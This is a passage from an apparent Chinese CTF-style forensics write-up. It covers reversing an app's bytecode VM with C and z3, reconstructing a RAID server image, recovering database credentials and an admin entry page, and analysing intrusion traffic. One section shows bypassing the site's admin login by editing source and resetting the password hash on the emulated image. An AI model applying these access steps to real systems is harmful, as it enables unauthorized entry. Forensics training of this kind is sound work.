0x51uLL; goto LABEL_20; case 1u: dword_341A4[v7] *= 2; goto LABEL_20; case 2u: v6 = *v3; goto LABEL_20; case 4u: v4 += (unsigned int)(v6 * dword_341A4[v7]); //形式类似方程中的 x1 * 12 + x2 * 14 + x3 * 52 ....... goto LABEL_20; case 5u: ++v7; goto LABEL_20; case 6u: ++v3; goto LABEL_20; case 7u: ++v4; goto LABEL_20; case 8u: dword_341A4[v7] += 12; goto LABEL_20; case 9u: --v4; goto LABEL_20; case 0xAu: v0 = v5++; if ( v4 == qword_342A8[v0] ) //比较值 &#123; v4 = 0LL; goto LABEL_20; &#125; return 0; case 0xBu: v3 -= 8; goto LABEL_20; case 0xCu: dword_341A4[v7] ^= 0x20u; goto LABEL_20; case 0xDu: dword_341A4[v7] -= 3; goto LABEL_20; default: goto LABEL_20; &#125;&#125;</code></pre><p>进行简单修改就可以使用 C 跑起来</p><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123; __int64 v0; // x9 int i; // [xsp+1Ch] [xbp-24h] //unsigned __int8 *v3; // [xsp+20h] [xbp-20h] __int64 v4; // [xsp+28h] [xbp-18h] int v5; // [xsp+30h] [xbp-10h] int v6; // [xsp+34h] [xbp-Ch] int v7; // [xsp+38h] [xbp-8h] unsigned char byte_34000[420] = &#123; 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x09, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x01, 0x01, 0x0A, 0x06, 0x07, 0x03, 0x0E, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x0D, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x0D, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x01, 0x01, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x09, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x01, 0x01, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x0D, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x01, 0x01, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x0E, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x00, 0x00 &#125;;unsigned int dword_341A4[65] = &#123; 0x00000091, 0x00000030, 0x00000038, 0x0000009A, 0x00000036, 0x00000023, 0x0000004A, 0x0000002A, 0x0000002D, 0x00000094, 0x00000024, 0x00000036, 0x00000018, 0x0000002D, 0x00000036, 0x00000020, 0x00000033, 0x00000094, 0x00000038, 0x0000009A, 0x00000162, 0x00000023, 0x000000AE, 0x0000002A, 0x0000000F, 0x00000030, 0x0000004A, 0x0000009A, 0x00000036, 0x00000033, 0x0000004A, 0x0000002A, 0x00000041, 0x00000030, 0x00000038, 0x0000009A, 0x00000036, 0x00000023, 0x0000004A, 0x0000008E, 0x0000005F, 0x00000030, 0x00000038, 0x0000004A, 0x00000036, 0x00000023, 0x0000002C, 0x0000002A, 0x00000091, 0x00000044, 0x00000038, 0x0000000F, 0x00000036, 0x00000023, 0x0000004A, 0x0000002A, 0x00000091, 0x00000030, 0x00000060, 0x0000009A, 0x0000009A, 0x00000023, 0x0000004A, 0x0000002A, 0x00000000&#125;; unsigned long qword_342A8[8] = &#123; 0x000000000000E51E, 0x0000000000009DE7, 0x00000000000137F6, 0x000000000000BEBA, 0x00000000000101A2, 0x00000000000092E8, 0x0000000000009204, 0x000000000000EF22 &#125;; char *v3 = &quot;12345678&quot;; v7 = 0; v6 = 0; v5 = 0; v4 = 0LL; for ( i = 0; i &lt; 418; ++i ) &#123; switch (byte_34000[i]) &#123; case 1u:v4 ^= 0x51uLL; goto LABEL_19; case 2u: dword_341A4[v7] *= 2; goto LABEL_19; case 3u: v6 = *v3; goto LABEL_19; case 5u: v4 += (unsigned int) (v6 * dword_341A4[v7]); ////在这里将值进行输出 printf(&quot;x%c * %d + &quot;, v6, dword_341A4[v7]); goto LABEL_19; case 6u: ++v7; goto LABEL_19; case 7u: ++v3; goto LABEL_19; case 8u: ++v4; goto LABEL_19; case 9u: dword_341A4[v7] += 12; goto LABEL_19; case 0xAu: --v4; goto LABEL_19; case 0xBu: v0 = v5++; printf(&quot;= %d\n&quot;, qword_342A8[v0]); //将最终比较的数据进行输出 break; //return 0; case 0xCu: v3 -= 8; goto LABEL_19; case 0xDu: dword_341A4[v7] ^= 0x20u; goto LABEL_19; case 0xEu: dword_341A4[v7] -= 3; goto LABEL_19; default: goto LABEL_19; LABEL_19: break; &#125; &#125; &#125;&#125;//跑起来后，会输出如下形式，8 元一次方程：x1 * 145 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 42 = 58654x1 * 90 + x2 * 148 + x3 * 36 + x4 * 54 + x5 * 24 + x6 * 45 + x7 * 54 + x8 * 32 = 40423x1 * 51 + x2 * 145 + x3 * 56 + x4 * 186 + x5 * 354 + x6 * 35 + x7 * 174 + x8 * 42 = 79862x1 * 47 + x2 * 48 + x3 * 74 + x4 * 154 + x5 * 54 + x6 * 51 + x7 * 74 + x8 * 42 = 48826x1 * 65 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74+ x8 * 142 = 65954x1 * 95 + x2 * 48 + x3 * 56 + x4 * 74 + x5 * 54 + x6 * 35 + x7 * 44 +x8 * 42 = 37608x1 * 145 + x2 * 68 + x3 * 56 + x4 * 15 + x5 * 54 + x6 * 35 + x7 * 74 + x8 * 42 = 37380x1 * 145 + x2 * 48 + x3 * 96 + x4 * 154 + x5 * 154 + x6 * 35 + x7 * 74 + x8 * 42 = 61218</code></pre><p>z3直接解</p><pre><code class="python">from z3 import *import hashlibdef hash_md5(data): hash=hashlib.md5() hash.update(bytes(data,encoding=&#39;utf-8&#39;)) return hash.hexdigest()x1 = Int(&#39;x1&#39;)x2 = Int(&#39;x2&#39;)x3 = Int(&#39;x3&#39;)x4 = Int(&#39;x4&#39;)x5 = Int(&#39;x5&#39;)x6 = Int(&#39;x6&#39;)x7 = Int(&#39;x7&#39;)x8 = Int(&#39;x8&#39;)s = Solver()s.add(x1 * 145 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 42 == 58654)s.add(x1 * 90 + x2 * 148 + x3 * 36 + x4 * 54 + x5 * 24 + x6 * 45 + x7* 54 + x8 * 32 == 40423)s.add(x1 * 51 + x2 * 145 + x3 * 56 + x4 * 186 + x5 * 354 + x6 * 35 + x7 * 174 + x8 * 42 == 79862)s.add(x1 * 47 + x2 * 48 + x3 * 74 + x4 * 154 + x5 * 54 + x6 * 51 + x7* 74 + x8 * 42 == 48826)s.add(x1 * 65 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 142 == 65954)s.add(x1 * 95 + x2 * 48 + x3 * 56 + x4 * 74 + x5 * 54 + x6 * 35 + x7 * 44 + x8 * 42 == 37608)s.add(x1 * 145 + x2 * 68 + x3 * 56 + x4 * 15 + x5 * 54 + x6 * 35 + x7* 74 + x8 * 42 == 37380)s.add(x1 * 145 + x2 * 48 + x3 * 96 + x4 * 154 + x5 * 154 + x6 * 35 + x7 * 74 + x8 * 42 == 61218)if (s.check() == sat): model = s.model() print(model) flag=&quot;&quot; for i in range(1, 9): if (model[eval(&quot;x&quot; + str(i))] != None): flag += chr(model[eval(&quot;x&quot; + str(i))].as_long().real) else: flag += &quot; &quot; print(&quot;HL&#123;&quot; + hash_md5(flag) + &quot;&#125;&quot;)</code></pre><p>app 的正确输入：AZaz09@}<br>最终答案：HL{96233a87c59bf7f0aa2ed16d9bc2e07a}</p><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><h3 id="1-请对所给服务器检材进行分析，请-写-出-管-理-员-安-装“mdadm-4-1-9-el7-9-x86-64”的时间？（答案格式：18-18-18）"><a href="#1-请对所给服务器检材进行分析，请-写-出-管-理-员-安-装“mdadm-4-1-9-el7-9-x86-64”的时间？（答案格式：18-18-18）" class="headerlink" title="1. 请对所给服务器检材进行分析，请 写 出 管 理 员 安 装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）"></a><strong>1. 请对所给服务器检材进行分析，请 写 出 管 理 员 安 装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）</strong></h3><pre><code>13:13:01</code></pre><p>使用命令搜索</p><p>rpm可以提供包的名称、版本、发布信息、安装日期、大小、构建日期、构建主机、安装后的大小、来源RPM、许可证、URL、摘要和描述等信息。</p><pre><code>rpm -qi mdadm </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261517242.png" alt="image-20240426151736184"></p><p>Install Data就是安装时间 <code>01:13:01 PM CST</code> 是下午的1点13分1秒 换成24小时制就是<code>13:13:01</code></p><h3 id="2-请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：-x2F-abc-x2F-def）"><a href="#2-请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：-x2F-abc-x2F-def）" class="headerlink" title="2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）"></a><strong>2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）</strong></h3><pre><code>/data</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242314026.png" alt="image-20240424231441889"></p><h3 id="3-请对所给服务器检材进行分析，请写出ip为192-168-157-1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）"><a href="#3-请对所给服务器检材进行分析，请写出ip为192-168-157-1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）" class="headerlink" title="3.请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）"></a>3.请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</h3><pre><code>2020-10-09 16:47:29</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261525429.png" alt="image-20240426152509355"></p><h3 id="4-请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）"><a href="#4-请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）" class="headerlink" title="4.请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）"></a>4.<strong>请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）</strong></h3><pre><code>hl@7001</code></pre><p>网站数据库的root账号密码 其实首先应该看<code>config/database.php</code>文件 我们从服务器分析出来的zip格式的压缩包中可以找到一个<code>shopxo.zip</code>  解压之后看起来很像网站源码的格式 但是会发现<code>config</code>文件夹下并没有<code>database.php</code>这个文件 需要另找出路</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261532227.png" alt="image-20240426153220162"></p><p>我们发现服务器部分的附件除了给了<code>server4.E01</code> 之外还给了<code>server1 server2 server3</code>三个文件 看起来很像raid重组 直接使用火眼的raid重组工具 </p><p>先查看raid信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261535159.png" alt="image-20240426153554128"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261536595.png" alt="image-20240426153602558"></p><p>在使用raid重组成逻辑盘 条带大小根据前面的raid信息改为1024 再点击生成文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261537560.png" alt="image-20240426153737509"></p><p>得到重组之后的镜像 然后使用UFS Explorer导出真正的磁盘镜像 导出为1.dsk</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261545162.png" alt="image-20240426154527051"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261545820.png" alt="image-20240426154554774"></p><p>使用给出的<code>server4.E01</code>和导出的<code>1.dsk</code>两个磁盘进行仿真 将<code>server4.E01</code>作为系统盘  </p><p>仿真后 查看磁盘使用情况 看到这块磁盘已经存在了 </p><pre><code>lsblk</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261550164.png" alt="image-20240426155051131"></p><p>还需要在挂载上 这块磁盘其实就是&#x2F;data分区</p><pre><code>mount /dev/sdb /data</code></pre><p>成功挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261551716.png" alt="image-20240426155148676"></p><p>此时的<code>/data/2023.cn/config/</code>文件夹下就有<code>database.php</code>了 成功查看到用户名和密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261552698.png" alt="image-20240426155257652"></p><h3 id="5-请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx-xx-xxx-xxx-）"><a href="#5-请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx-xx-xxx-xxx-）" class="headerlink" title="5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）"></a><strong>5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）</strong></h3><pre><code>md5($salt.trim($pwd))</code></pre><p>直接在源码里面搜<code>$pwd</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242327139.png" alt="image-20240424232724073"></p><h3 id="6-请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）"><a href="#6-请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）" class="headerlink" title="6. 请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）"></a>6. 请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</h3><pre><code>2020-07-09 13:46:17</code></pre><h4 id="解决xshell和xftp连接问题"><a href="#解决xshell和xftp连接问题" class="headerlink" title="解决xshell和xftp连接问题"></a>解决xshell和xftp连接问题</h4><p>在仿真镜像后 我们会发现无法正常连接xshell和xftp  这篇文章可以解决</p><p><a href="https://blog.csdn.net/Jupite_ch/article/details/107034135">centos服务器拒绝ssh连接问题</a></p><p>查看<code>hosts.allow和hosts.deny</code>两个文件 将里面最后一行的内容直接注释就可以正常连接xshell和xftp</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261628619.png" alt="image-20240426162853579"></p><p>解决这个问题之后 我们直接连上xftp 将网站源码保存到本地 然后使用FileLocator搜索<code>弘连</code>关键字 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261643669.png" alt="image-20240426164333588"></p><h3 id="7-请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx-php）"><a href="#7-请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx-php）" class="headerlink" title="7. 请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx.php）"></a><strong>7.</strong> <strong>请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：<strong><strong>xxx.php</strong></strong>）</strong></h3><pre><code>4008003721.php</code></pre><p>查看网站操作日志 看到将<code>admin.php</code>文件重命名为了<code>4008003721.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261650783.png" alt="image-20240426165026735"></p><p>为了验证一下这个结果 我们需要重构网站一下 </p><p>我们在火眼的分析结果中看到存在docker容器 并且是mysql的容器 同时使用<code>netstat -lnpt</code>命令查看端口使用情况看到本地mysql端口是3306 但是<code>database.php</code>中写的mysql服务端口是3307 说明这个网站的数据库在docker容器中 而不是服务器本机中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261659342.png" alt="image-20240426165908311"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261659636.png" alt="image-20240426165937577"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261527826.png" alt="image-20240426152750756"></p><p>我们在挂载上raid重组盘之后 就解决了宝塔面板中没有网站源码的问题 下一步直接启动docker容器中的mysql服务即可</p><pre><code>docker ps -a docker start 8fbd1968d75e</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261701189.png" alt="image-20240426170118160"></p><p>然后修改我们本地hosts文件 使用火绒就行 在其中添加</p><pre><code>192.168.24.133 www.hl2023.cn</code></pre><p>赋予网站源码全部权限 </p><pre><code>chmod 777 -R 2023.cn</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261703443.png" alt="image-20240426170337405"></p><p>就可以访问网站了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261704955.png" alt="image-20240426170411630"></p><p>在访问前面找到的后台管理页面 成功访问 说明这个页面就是后台管理页面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261704169.png" alt="image-20240426170459010"></p><h4 id="后台密码绕过"><a href="#后台密码绕过" class="headerlink" title="后台密码绕过"></a>后台密码绕过</h4><p>顺便说一下 怎么绕过后台登陆密码 前面我们也知道了后台登陆密码的加密方式是带盐值的md5加密 我们直接修改网站源码 将加密方式改为直接md5加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261713965.png" alt="image-20240426171324931"></p><p>使用cmd5网站 得到<code>123456</code>的md5加密值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261714682.png" alt="image-20240426171428611"></p><p>在docker中进入mysql服务 修改admin的密码为123456的md5加密值 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261714491.png" alt="image-20240426171456404"></p><p>访问后台管理页面 使用<code>admin/123456</code>成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261717422.png" alt="image-20240426171726286"></p><h3 id="8-请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写"><a href="#8-请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写" class="headerlink" title="8.请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写"></a>8.请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写</h3><pre><code>9dede75e455a7c4c5cc4b61e41570adf82af25251c5fd8456a637add864b0af0</code></pre><p>在宝塔中看到数据库存在备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261651058.png" alt="image-20240426165144979"></p><p>从火眼分析中找这个文件 导出计算sha256</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261652274.png" alt="image-20240426165225224"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261652251.png" alt="image-20240426165250217"></p><h3 id="9-请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）"><a href="#9-请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）" class="headerlink" title="9.请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）"></a>9.<strong>请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）</strong></h3><pre><code>22Ga#ce3ZBHV&amp;Fr59fE#</code></pre><p>服务器文件系统中root文件夹下有个<code>.w0rd.txt</code>文档 是解压密码字典 提出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242344645.png" alt="image-20240424234407538"></p><p>放passwarekit里面字典爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242347329.png" alt="image-20240424234702221"></p><h3 id="10-请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999-99）"><a href="#10-请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999-99）" class="headerlink" title="10. 请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）"></a><strong>10. 请对所给服务器检材进行分析，商城中“</strong>弘连火眼手机分析专用机MT510<strong>”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）</strong></h3><pre><code>1398000.00</code></pre><p>直接在网站中搜不到 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261707324.png" alt="image-20240426170707259"></p><p>用我们上面解压出的数据库备份文件 直接在宝塔中导入恢复</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261707783.png" alt="image-20240426170734703"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261711325.png" alt="image-20240426171110222"></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="1-请分析流量分析-pcapng文件，并回答入侵者的IP地址是？"><a href="#1-请分析流量分析-pcapng文件，并回答入侵者的IP地址是？" class="headerlink" title="1.请分析流量分析.pcapng文件，并回答入侵者的IP地址是？"></a>1.请分析流量分析.pcapng文件，并回答入侵者的IP地址是？</h3><pre><code>192.168.85.130</code></pre><p>最后拿到权限之后从这个ip上下载了文件 那么这个ip就是攻击者ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261722393.png" alt="image-20240426172226311"></p><h3 id="2-请分析流量分析-pcapng文件，并回答被入侵计算机中的cms软件版本是？-答案格式：1-1-1"><a href="#2-请分析流量分析-pcapng文件，并回答被入侵计算机中的cms软件版本是？-答案格式：1-1-1" class="headerlink" title="2.请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)"></a>2.请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)</h3><pre><code>5.2.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261722888.png" alt="image-20240426172253849"></p><h3 id="3-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQL版本号是？-答案格式：1-1-1"><a href="#3-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQL版本号是？-答案格式：1-1-1" class="headerlink" title="3.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)"></a>3.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)</h3><pre><code>5.5.53</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261723748.png" alt="image-20240426172311686"></p><h3 id="4-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？"><a href="#4-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？" class="headerlink" title="4.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？"></a>4.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？</h3><pre><code>admin@12345</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261723712.png" alt="image-20240426172333674"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261725676.png" alt="image-20240426172525606"></p><h3 id="5-请分析流量分析-pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？"><a href="#5-请分析流量分析-pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？" class="headerlink" title="5.请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？"></a>5.<strong>请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？</strong></h3><pre><code>06b8dcf11e2f7adf7ea2999d235b8d84.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271946438.png" alt="image-20240424212945089"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271946041.png" alt="image-20240424212952731"></p><h3 id="6-请分析流量分析-pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？"><a href="#6-请分析流量分析-pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？" class="headerlink" title="6.请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？"></a>6.请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？</h3><pre><code>10个</code></pre><p>直接搜<code>disable_function</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947799.png" alt="image-20240424210620482"></p><p>一共10个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947044.png" alt="image-20240424210642713"></p><h3 id="7-请分析流量分析-pcapng文件，并回答入侵者提权后，执行的第1条命令是？"><a href="#7-请分析流量分析-pcapng文件，并回答入侵者提权后，执行的第1条命令是？" class="headerlink" title="7.请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？"></a>7.<strong>请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？</strong></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947241.png" alt="image-20240424210144330"></p><pre><code>dir</code></pre><h3 id="8-请分析流量分析-pcapng文件，并回答被入侵计算机开机时间是？"><a 